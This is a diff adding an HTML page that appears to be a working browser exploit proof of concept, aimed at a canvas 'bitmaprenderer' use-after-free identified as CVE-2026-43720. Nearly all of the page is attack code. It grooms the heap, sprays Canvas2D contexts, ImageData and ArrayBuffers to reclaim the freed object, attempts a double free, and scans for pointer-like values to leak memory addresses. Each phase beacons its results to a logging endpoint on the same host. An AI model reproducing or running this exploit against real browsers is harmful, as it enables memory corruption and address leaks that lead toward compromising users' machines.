@@ -1,0 +1,615 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635b</title></head>
+<body><pre id="out">p635b: Canvas UAF info leak — stale read + heap groom</pre>
+<script>
+'use strict';
+/*
+  p635b: CVE-2026-43720 info leak escalation
+  -- prior art: p635v3 confirmed alias at spray[9], 48B+7prop R/W
+  -- prior art: batch1_cve2026_43720_xref.md — intermediate-object reclaim + pre-spray-then-UAF untested
+  -- prior art: p635v2 crashed on pre-reclaim access (but no per-property try/catch)
+
+  CRASH_CLASS: HIGH — UAF reads on stale heap memory
+
+  Strategy:
+  A) Trigger UAF, read EVERY property via innerCtx BEFORE spray (per-prop try/catch)
+     → if any succeed, we read stale C++ data (vtable/pointer fragments as doubles)
+  B) Pre-groom heap with ~768B allocations, free them, trigger UAF, spray, read alias
+     → check for non-default values leaking through
+  C) Read transform matrix doubles after reclaim — check for pointer-like float64 values
+  D) Cross-type reclaim: instead of Canvas2D spray, use ImageData(~96 wide) for ~768B backing
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635B-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635b', msg:msg, level:'info', sid:'p635b-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+bk('START', navigator.userAgent);
+
+// Helper: interpret float64 bits as hex
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    var hi = u[1], lo = u[0];
+    return ((hi >>> 0).toString(16)).padStart(8, '0') + ((lo >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false; // NaN check
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var u = new Uint32Array(buf);
+  var hi = u[1];
+  // Kernel pointer: 0xFFFF8xxx, heap pointer: 0x7Fxx-0x7Fff range
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF); // 48-bit userland
+}
+
+// ================================================================
+// PHASE 0: Confirm bitmaprenderer
+// ================================================================
+var tc = document.createElement('canvas');
+var bmr = tc.getContext('bitmaprenderer');
+if (!bmr) { bk('DEAD', 'no bitmaprenderer'); throw new Error('no bmr'); }
+bk('P0', 'bmr OK');
+tc = null; bmr = null;
+
+// ================================================================
+// PHASE A: Stale-read test — trigger UAF, read BEFORE spray
+// ================================================================
+bk('A-START', 'stale read test');
+
+var innerA = null;
+var cvA = document.createElement('canvas');
+cvA.width = 1; cvA.height = 1;
+var optsA = {};
+Object.defineProperty(optsA, 'alpha', {
+  get: function() {
+    innerA = cvA.getContext('2d');
+    return true;
+  }
+});
+try { cvA.getContext('bitmaprenderer', optsA); } catch(e) {}
+
+if (!innerA) {
+  bk('A-FAIL', 'no inner context');
+} else {
+  // innerCtx is now dangling — freed 768B. Try reading each property individually.
+  var props = ['lineWidth','miterLimit','globalAlpha','shadowBlur',
+               'shadowOffsetX','shadowOffsetY','lineDashOffset',
+               'fillStyle','strokeStyle','font','textAlign','textBaseline',
+               'lineCap','lineJoin','globalCompositeOperation'];
+  var staleHits = [];
+  for (var i = 0; i < props.length; i++) {
+    try {
+      var val = innerA[props[i]];
+      staleHits.push(props[i] + '=' + (typeof val === 'number' ? f64hex(val) + '(' + val + ')' : String(val).slice(0,40)));
+    } catch(e) {
+      staleHits.push(props[i] + '=CRASH:' + e.message.slice(0,30));
+    }
+  }
+  bk('A-PROPS', staleHits.join(' | '));
+
+  // Try getTransform — 6 doubles from the raw object
+  try {
+    var tx = innerA.getTransform();
+    bk('A-TRANSFORM', 'a=' + f64hex(tx.a) + ' b=' + f64hex(tx.b) +
+       ' c=' + f64hex(tx.c) + ' d=' + f64hex(tx.d) +
+       ' e=' + f64hex(tx.e) + ' f=' + f64hex(tx.f));
+    // Check for pointer-like values
+    var txvals = [tx.a, tx.b, tx.c, tx.d, tx.e, tx.f];
+    for (var j = 0; j < txvals.length; j++) {
+      if (isPointerLike(txvals[j])) {
+        bk('A-PTR', 'transform[' + j + ']=' + f64hex(txvals[j]) + ' POINTER-LIKE');
+      }
+    }
+  } catch(e) {
+    bk('A-TRANSFORM', 'CRASH:' + e.message.slice(0,60));
+  }
+
+  // Try getLineDash — returns array, might contain stale data
+  try {
+    var ld = innerA.getLineDash();
+    bk('A-LINEDASH', 'len=' + ld.length + (ld.length > 0 ? ' [0]=' + f64hex(ld[0]) : ''));
+  } catch(e) {
+    bk('A-LINEDASH', 'CRASH:' + e.message.slice(0,40));
+  }
+
+  // Try measureText — triggers internal allocations, may crash with stale state
+  try {
+    var mt = innerA.measureText('A');
+    bk('A-MEASURE', 'width=' + f64hex(mt.width));
+  } catch(e) {
+    bk('A-MEASURE', 'CRASH:' + e.message.slice(0,40));
+  }
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: Heap groom + UAF — pre-allocate 768B objects, free, trigger, read
+// ================================================================
+bk('B-START', 'heap groom');
+
+// Step 1: Fill heap with ~768B string allocations (StringImpl is header + chars)
+// A 376-char string ≈ 16 (StringImpl header) + 376*2 (UTF-16) = 768 bytes
+var GROOM_COUNT = 500;
+var groomStrings = [];
+for (var i = 0; i < GROOM_COUNT; i++) {
+  // Fill with non-null pattern — each string has unique bytes
+  var chars = [];
+  for (var j = 0; j < 376; j++) {
+    chars.push(String.fromCharCode(0x4100 + (i & 0xFF)));
+  }
+  groomStrings.push(chars.join(''));
+}
+bk('B-ALLOC', GROOM_COUNT + ' strings allocated');
+
+// Step 2: Free them — leaves 768B holes with stale data
+groomStrings = null;
+// Force GC pressure
+for (var gc = 0; gc < 50; gc++) {
+  try { new ArrayBuffer(65536); } catch(e) { break; }
+}
+bk('B-FREE', 'strings freed, GC pressured');
+
+// Step 3: Trigger UAF — the 2d context's 768B allocation may land on a stale hole
+var innerB = null;
+var cvB = document.createElement('canvas');
+cvB.width = 1; cvB.height = 1;
+var optsB = {};
+Object.defineProperty(optsB, 'alpha', {
+  get: function() {
+    innerB = cvB.getContext('2d');
+    return true;
+  }
+});
+try { cvB.getContext('bitmaprenderer', optsB); } catch(e) {}
+
+if (!innerB) {
+  bk('B-FAIL', 'no inner');
+} else {
+  // Step 4: Spray Canvas2D to reclaim
+  var sprayB = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayB.push(ctx);
+  }
+  bk('B-SPRAY', sprayB.length + ' contexts');
+
+  // Step 5: Find alias
+  var SENT = 7331.25;
+  var aliasB = -1;
+  try { innerB.lineWidth = SENT; } catch(e) {}
+  for (var i = 0; i < sprayB.length; i++) {
+    if (sprayB[i].lineWidth === SENT) { aliasB = i; break; }
+  }
+  bk('B-ALIAS', aliasB >= 0 ? 'spray[' + aliasB + ']' : 'NONE');
+
+  if (aliasB >= 0) {
+    var a = sprayB[aliasB];
+    // Read all numeric properties through alias — look for non-default values
+    var numProps = ['lineWidth','miterLimit','globalAlpha','shadowBlur',
+                    'shadowOffsetX','shadowOffsetY','lineDashOffset'];
+    var defaults = [1, 10, 1, 0, 0, 0, 0]; // Canvas2D defaults
+    var leaks = [];
+    // First reset sentinel
+    innerB.lineWidth = 1;
+    for (var i = 0; i < numProps.length; i++) {
+      try {
+        var val = a[numProps[i]];
+        if (val !== defaults[i]) {
+          leaks.push(numProps[i] + '=' + f64hex(val) + '(' + val + ')');
+        }
+      } catch(e) {}
+    }
+    bk('B-LEAKS', leaks.length > 0 ? leaks.join(' | ') : 'none (all defaults)');
+
+    // Read transform via alias
+    try {
+      // Don't set transform — read whatever was there from reclaim
+      // Reset first to see if default is identity
+      // Actually DON'T reset — read raw
+      var txB = a.getTransform();
+      var txStr = 'a=' + f64hex(txB.a) + ' b=' + f64hex(txB.b) +
+                  ' c=' + f64hex(txB.c) + ' d=' + f64hex(txB.d) +
+                  ' e=' + f64hex(txB.e) + ' f=' + f64hex(txB.f);
+      bk('B-TX', txStr);
+      var txvB = [txB.a, txB.b, txB.c, txB.d, txB.e, txB.f];
+      for (var j = 0; j < txvB.length; j++) {
+        if (isPointerLike(txvB[j])) {
+          bk('B-PTR', 'tx[' + j + ']=' + f64hex(txvB[j]) + ' POINTER-LIKE');
+        }
+      }
+    } catch(e) {
+      bk('B-TX', 'ERR:' + e.message.slice(0,40));
+    }
+  }
+}
+bk('B-DONE', 'survived');
+
+// ================================================================
+// PHASE C: Fresh UAF + read spray context's raw state BEFORE writing sentinel
+// ================================================================
+bk('C-START', 'raw-state read');
+
+var innerC = null;
+var cvC = document.createElement('canvas');
+cvC.width = 1; cvC.height = 1;
+var optsC = {};
+Object.defineProperty(optsC, 'alpha', {
+  get: function() {
+    innerC = cvC.getContext('2d');
+    return true;
+  }
+});
+try { cvC.getContext('bitmaprenderer', optsC); } catch(e) {}
+
+if (!innerC) {
+  bk('C-FAIL', 'no inner');
+} else {
+  // Spray with contexts that have NON-default values at specific offsets
+  var sprayC = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) {
+      // Set unique patterns — encode index in the double
+      ctx.setTransform(0.0001 * (i+1), 0, 0, 0.0001 * (i+1), 0, 0);
+      ctx.lineWidth = 10000 + i;
+      ctx.miterLimit = 20000 + i;
+      ctx.shadowBlur = 30000 + i;
+      ctx.shadowOffsetX = 40000 + i;
+      ctx.shadowOffsetY = 50000 + i;
+      ctx.lineDashOffset = 60000 + i;
+      ctx.globalAlpha = (i + 1) / 201;
+      sprayC.push(ctx);
+    }
+  }
+  bk('C-SPRAY', sprayC.length);
+
+  // Read through innerC — which spray context did we alias?
+  var readC = {};
+  try { readC.lw = innerC.lineWidth; } catch(e) { readC.lw = 'E'; }
+  try { readC.ml = innerC.miterLimit; } catch(e) { readC.ml = 'E'; }
+  try { readC.sb = innerC.shadowBlur; } catch(e) { readC.sb = 'E'; }
+  try { readC.sox = innerC.shadowOffsetX; } catch(e) { readC.sox = 'E'; }
+  try { readC.soy = innerC.shadowOffsetY; } catch(e) { readC.soy = 'E'; }
+  try { readC.ldo = innerC.lineDashOffset; } catch(e) { readC.ldo = 'E'; }
+  try { readC.ga = innerC.globalAlpha; } catch(e) { readC.ga = 'E'; }
+  bk('C-READ', JSON.stringify(readC));
+
+  // Now check: do the values match a spray context's pattern?
+  var lwVal = readC.lw;
+  if (typeof lwVal === 'number' && lwVal >= 10000 && lwVal < 10200) {
+    var idx = lwVal - 10000;
+    bk('C-MATCH', 'alias=spray[' + idx + '] (from lineWidth pattern)');
+    // This means reclaim worked — but we get spray values, not stale data
+  } else if (typeof lwVal === 'number' && lwVal !== 1) {
+    // Non-default, non-spray value — could be stale data!
+    bk('C-STALE', 'lineWidth=' + f64hex(lwVal) + '(' + lwVal + ') NON-SPRAY NON-DEFAULT');
+  } else if (lwVal === 1) {
+    bk('C-DEFAULT', 'lineWidth is default (1) — no alias or fresh context');
+  }
+
+  // Read transform
+  try {
+    var txC = innerC.getTransform();
+    bk('C-TX', 'a=' + f64hex(txC.a) + '(' + txC.a + ') d=' + f64hex(txC.d) + '(' + txC.d + ')');
+    if (txC.a !== 1 && txC.a !== 0) {
+      // Non-identity transform — either spray match or stale data
+      var txIdx = Math.round(txC.a / 0.0001) - 1;
+      if (txIdx >= 0 && txIdx < 200) {
+        bk('C-TX-MATCH', 'alias=spray[' + txIdx + '] (from transform)');
+      } else {
+        bk('C-TX-STALE', 'a=' + f64hex(txC.a) + ' NON-SPRAY');
+      }
+    }
+  } catch(e) {
+    bk('C-TX', 'ERR:' + e.message.slice(0,40));
+  }
+
+  // Full hex dump of all readable doubles
+  var allDoubles = [];
+  try {
+    var txD = innerC.getTransform();
+    allDoubles.push('tx.a=' + f64hex(txD.a));
+    allDoubles.push('tx.b=' + f64hex(txD.b));
+    allDoubles.push('tx.c=' + f64hex(txD.c));
+    allDoubles.push('tx.d=' + f64hex(txD.d));
+    allDoubles.push('tx.e=' + f64hex(txD.e));
+    allDoubles.push('tx.f=' + f64hex(txD.f));
+  } catch(e) { allDoubles.push('tx=ERR'); }
+  try { allDoubles.push('lw=' + f64hex(innerC.lineWidth)); } catch(e) {}
+  try { allDoubles.push('ml=' + f64hex(innerC.miterLimit)); } catch(e) {}
+  try { allDoubles.push('ga=' + f64hex(innerC.globalAlpha)); } catch(e) {}
+  try { allDoubles.push('sb=' + f64hex(innerC.shadowBlur)); } catch(e) {}
+  try { allDoubles.push('sox=' + f64hex(innerC.shadowOffsetX)); } catch(e) {}
+  try { allDoubles.push('soy=' + f64hex(innerC.shadowOffsetY)); } catch(e) {}
+  try { allDoubles.push('ldo=' + f64hex(innerC.lineDashOffset)); } catch(e) {}
+  bk('C-HEXDUMP', allDoubles.join(' '));
+}
+bk('C-DONE', 'survived');
+
+// ================================================================
+// PHASE D: ImageData cross-type reclaim
+// ImageData(w,h) backing = w*h*4 bytes. For 768B: w*h = 192 → 192x1
+// ================================================================
+bk('D-START', 'ImageData cross-type reclaim');
+
+var innerD = null;
+var cvD = document.createElement('canvas');
+cvD.width = 1; cvD.height = 1;
+var optsD = {};
+Object.defineProperty(optsD, 'alpha', {
+  get: function() {
+    innerD = cvD.getContext('2d');
+    return true;
+  }
+});
+try { cvD.getContext('bitmaprenderer', optsD); } catch(e) {}
+
+if (!innerD) {
+  bk('D-FAIL', 'no inner');
+} else {
+  // Spray with ImageData objects — backing store is 768 bytes
+  // ImageData(192, 1) → 192 * 1 * 4 = 768 bytes backing
+  var imgDatas = [];
+  for (var i = 0; i < 300; i++) {
+    try {
+      var id = new ImageData(192, 1);
+      // Fill with marker pattern
+      for (var j = 0; j < id.data.length; j++) {
+        id.data[j] = (i + j) & 0xFF;
+      }
+      imgDatas.push(id);
+    } catch(e) { break; }
+  }
+  bk('D-SPRAY', imgDatas.length + ' ImageData(192,1)');
+
+  // Try reading through innerD — this is a Canvas2D C++ virtual call
+  // on memory that might now be an ImageData backing store
+  var readD = {};
+  try { readD.lw = innerD.lineWidth; } catch(e) { readD.lw = 'CRASH:' + e.message.slice(0,30); }
+  try { readD.ml = innerD.miterLimit; } catch(e) { readD.ml = 'CRASH:' + e.message.slice(0,30); }
+  try { readD.ga = innerD.globalAlpha; } catch(e) { readD.ga = 'CRASH:' + e.message.slice(0,30); }
+  bk('D-READ', JSON.stringify(readD));
+
+  // If reads succeeded, dump hex
+  if (typeof readD.lw === 'number') {
+    bk('D-HEX', 'lw=' + f64hex(readD.lw) + ' ml=' + f64hex(readD.ml) + ' ga=' + f64hex(readD.ga));
+    if (isPointerLike(readD.lw)) bk('D-PTR', 'lineWidth POINTER-LIKE');
+    if (isPointerLike(readD.ml)) bk('D-PTR', 'miterLimit POINTER-LIKE');
+  }
+
+  try {
+    var txD2 = innerD.getTransform();
+    bk('D-TX', 'a=' + f64hex(txD2.a) + ' b=' + f64hex(txD2.b) +
+       ' c=' + f64hex(txD2.c) + ' d=' + f64hex(txD2.d));
+  } catch(e) {
+    bk('D-TX', 'CRASH:' + e.message.slice(0,40));
+  }
+}
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Double free — trigger UAF, partial spray, second UAF on same slot
+// If reclaim + alias works, try to FREE the alias context and see if
+// the now-double-freed slot gets reclaimed by an ArrayBuffer whose
+// raw bytes we can read
+// ================================================================
+bk('E-START', 'double-free to ArrayBuffer');
+
+var innerE = null;
+var cvE = document.createElement('canvas');
+cvE.width = 1; cvE.height = 1;
+var optsE = {};
+Object.defineProperty(optsE, 'alpha', {
+  get: function() {
+    innerE = cvE.getContext('2d');
+    return true;
+  }
+});
+try { cvE.getContext('bitmaprenderer', optsE); } catch(e) {}
+
+if (!innerE) {
+  bk('E-FAIL', 'no inner');
+} else {
+  // Normal spray to get alias
+  var sprayE = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) {
+      ctx.lineWidth = 1.0 + i * 0.001;
+      sprayE.push({ctx: ctx, canvas: c});
+    }
+  }
+
+  var SENTE = 8888.5;
+  try { innerE.lineWidth = SENTE; } catch(e) {}
+  var aliasE = -1;
+  for (var i = 0; i < sprayE.length; i++) {
+    if (sprayE[i].ctx.lineWidth === SENTE) { aliasE = i; break; }
+  }
+  bk('E-ALIAS', aliasE >= 0 ? 'spray[' + aliasE + ']' : 'NONE');
+
+  if (aliasE >= 0) {
+    // Write recognizable pattern through alias BEFORE attempting free
+    innerE.setTransform(0xDEAD, 0xBEEF, 0xCAFE, 0xBABE, 0xF00D, 0xFACE);
+    innerE.lineWidth = 0x41414141;
+    innerE.miterLimit = 0x42424242;
+    innerE.shadowBlur = 0x43434343;
+
+    // Now "free" the alias canvas — removing it might trigger GC of the context
+    var aliasCanvas = sprayE[aliasE].canvas;
+    sprayE[aliasE].canvas = null;
+    sprayE[aliasE].ctx = null;
+
+    // Remove from DOM and null out
+    if (aliasCanvas.parentNode) aliasCanvas.parentNode.removeChild(aliasCanvas);
+    aliasCanvas.width = 0; // trigger internal cleanup
+    aliasCanvas = null;
+
+    // Force GC
+    for (var gc = 0; gc < 100; gc++) {
+      try { new ArrayBuffer(65536); } catch(e) { break; }
+    }
+
+    // Now spray ArrayBuffers of 768 bytes — try to reclaim the freed context
+    var abSpray = [];
+    for (var i = 0; i < 500; i++) {
+      var ab = new ArrayBuffer(768);
+      abSpray.push(ab);
+    }
+    bk('E-AB-SPRAY', abSpray.length + ' ArrayBuffers');
+
+    // Check each ArrayBuffer for our marker pattern
+    var found = false;
+    for (var i = 0; i < abSpray.length; i++) {
+      var view = new Float64Array(abSpray[i]);
+      // Check for our marker values at any offset
+      for (var j = 0; j < view.length; j++) {
+        if (view[j] === 0xDEAD || view[j] === 0x41414141 || view[j] === 0x42424242) {
+          bk('E-RECLAIM', 'AB[' + i + '] offset=' + j + ' val=' + f64hex(view[j]) + ' MARKER FOUND');
+          found = true;
+          // Dump surrounding values
+          var dump = [];
+          for (var k = Math.max(0, j-2); k < Math.min(view.length, j+4); k++) {
+            dump.push('[' + k + ']=' + f64hex(view[k]));
+          }
+          bk('E-DUMP', dump.join(' '));
+          break;
+        }
+        // Also check for pointer-like values
+        if (isPointerLike(view[j]) && !found) {
+          bk('E-PTR', 'AB[' + i + '][' + j + ']=' + f64hex(view[j]) + ' POINTER-LIKE');
+          found = true;
+          var dump2 = [];
+          for (var k = 0; k < Math.min(view.length, 12); k++) {
+            dump2.push('[' + k + ']=' + f64hex(view[k]));
+          }
+          bk('E-FULL', dump2.join(' '));
+          break;
+        }
+      }
+      if (found) break;
+    }
+    if (!found) {
+      bk('E-RESULT', 'no markers or pointers found in ArrayBuffers');
+      // Check if innerE still works (context wasn't actually freed)
+      try {
+        var lwE = innerE.lineWidth;
+        bk('E-STILL-ALIVE', 'innerE.lineWidth=' + lwE + ' (context not freed by canvas cleanup)');
+      } catch(e) {
+        bk('E-FREED', 'innerE access crashed — context was freed');
+      }
+    }
+  }
+}
+bk('E-DONE', 'survived');
+
+// ================================================================
+// PHASE F: Offset mapping — write unique doubles through alias, read back
+// through innerCtx, to detect any field mapping surprises
+// ================================================================
+bk('F-START', 'offset mapping');
+
+var innerF = null;
+var cvF = document.createElement('canvas');
+cvF.width = 1; cvF.height = 1;
+var optsF = {};
+Object.defineProperty(optsF, 'alpha', {
+  get: function() {
+    innerF = cvF.getContext('2d');
+    return true;
+  }
+});
+try { cvF.getContext('bitmaprenderer', optsF); } catch(e) {}
+
+if (!innerF) {
+  bk('F-FAIL', 'no inner');
+} else {
+  var sprayF = [];
+  for (var i = 0; i < 200; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    if (ctx) sprayF.push(ctx);
+  }
+  var SENTF = 4242.75;
+  try { innerF.lineWidth = SENTF; } catch(e) {}
+  var aliasF = -1;
+  for (var i = 0; i < sprayF.length; i++) {
+    if (sprayF[i].lineWidth === SENTF) { aliasF = i; break; }
+  }
+
+  if (aliasF >= 0) {
+    var af = sprayF[aliasF];
+    // Write unique magic values through ALIAS
+    af.setTransform(1.0000001, 2.0000002, 3.0000003, 4.0000004, 5.0000005, 6.0000006);
+    af.lineWidth = 11.11;
+    af.miterLimit = 22.22;
+    af.globalAlpha = 0.3333;
+    af.shadowBlur = 44.44;
+    af.shadowOffsetX = 55.55;
+    af.shadowOffsetY = 66.66;
+    af.lineDashOffset = 77.77;
+
+    // Read back through INNER — every value should match if they share the same object
+    var map = [];
+    try { map.push('lw:' + (innerF.lineWidth === 11.11)); } catch(e) { map.push('lw:E'); }
+    try { map.push('ml:' + (innerF.miterLimit === 22.22)); } catch(e) { map.push('ml:E'); }
+    try { map.push('ga:' + (innerF.globalAlpha === 0.3333)); } catch(e) { map.push('ga:E'); }
+    try { map.push('sb:' + (innerF.shadowBlur === 44.44)); } catch(e) { map.push('sb:E'); }
+    try { map.push('sox:' + (innerF.shadowOffsetX === 55.55)); } catch(e) { map.push('sox:E'); }
+    try { map.push('soy:' + (innerF.shadowOffsetY === 66.66)); } catch(e) { map.push('soy:E'); }
+    try { map.push('ldo:' + (innerF.lineDashOffset === 77.77)); } catch(e) { map.push('ldo:E'); }
+    try {
+      var txF = innerF.getTransform();
+      map.push('tx:a=' + (txF.a === 1.0000001) + ' d=' + (txF.d === 4.0000004));
+    } catch(e) { map.push('tx:E'); }
+    bk('F-MAP', map.join(' '));
+    bk('F-ALIAS', 'spray[' + aliasF + ']');
+
+    // CRITICAL: Try fillStyle/strokeStyle as string channel
+    try {
+      af.fillStyle = '#aabbcc';
+      bk('F-FS', 'alias.fillStyle=#aabbcc inner.fillStyle=' + innerF.fillStyle);
+    } catch(e) { bk('F-FS', 'ERR:' + e.message.slice(0,30)); }
+
+    // Test: can we read stale fillStyle string pointer?
+    // After setting fillStyle, the C++ object stores a pointer to the color string.
+    // If we could read the raw bytes at that offset, we'd get a heap pointer.
+    // Can't do that directly — but font might give us something
+    try {
+      af.font = '12px serif';
+      bk('F-FONT', 'inner.font=' + innerF.font);
+    } catch(e) { bk('F-FONT', 'ERR:' + e.message.slice(0,30)); }
+  } else {
+    bk('F-ALIAS', 'NONE');
+  }
+}
+bk('F-DONE', 'survived');
+
+bk('DONE', 'all phases complete');
+</script>
+</body></html>
